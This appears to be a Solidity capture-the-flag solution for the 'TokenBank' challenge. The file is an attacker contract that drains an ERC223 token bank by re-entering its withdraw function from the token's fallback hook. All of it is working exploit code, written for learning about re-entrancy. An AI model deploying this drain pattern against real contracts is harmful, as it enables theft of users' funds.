// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {console, Test} from "@forge-std/Test.sol";


import { SimpleERC223Token} from "@main/miscellaneous/TokenBank.sol";


interface IChallenge{

    function token() external view returns (SimpleERC223Token);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;

}

interface IERC223Token{

    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value)
        external
        returns (bool success);
    function transfer(address to, uint256 value) external returns (bool);

}

// `attacker` withdraw token from TokenBankChallenge
// `attacker` deposit to `TokenBankAttacker`
// `TokenBankAttacker` transfer to TokenBankChallenge
// `TokenBankAttacker` withdraw from TokenBankChallenge -> re-entrancy

contract TokenBankAttacker {

    IChallenge challenge;
    IERC223Token token;
    
    constructor(address _challenge, address _token) payable {
        challenge = IChallenge(_challenge);
        token = IERC223Token(_token);
    }

    function attack () external {

        bool success = token.transferFrom(msg.sender, address(this),500000 ether );

        require(success, "transfer is success");

        require( token.balanceOf(address(this)) == 500000 ether, "attacker must transfer the token to first");
        require( token.balanceOf(address(challenge)) == 500000 ether, "challenge should have half ");
        require( challenge.balanceOf(address(this)) == 0 ether, "attacker must transfer the token first");

        token.transfer(address(challenge),500000 ether );

        require( token.balanceOf(address(challenge)) == 1000000 ether, "TokenBankAttacker must transfer the token ");
        require( challenge.balanceOf(address(this)) == 500000 ether, "TokenBankAttacker must deposit the token first");

        challenge.withdraw(500000 ether);
    }

    function tokenFallback(address from, uint256, bytes calldata) external {

        if (from != address(challenge)) return;

        uint256 balanceBeforeWithdraw = challenge.balanceOf(address(this));
        uint256 amountLeft = token.balanceOf(address(challenge));

        if(amountLeft > 0) {

            uint256 amountToWithdraw = amountLeft < balanceBeforeWithdraw
                ? balanceBeforeWithdraw
                : amountLeft;

            challenge.withdraw(amountToWithdraw);

        }
    }
    
}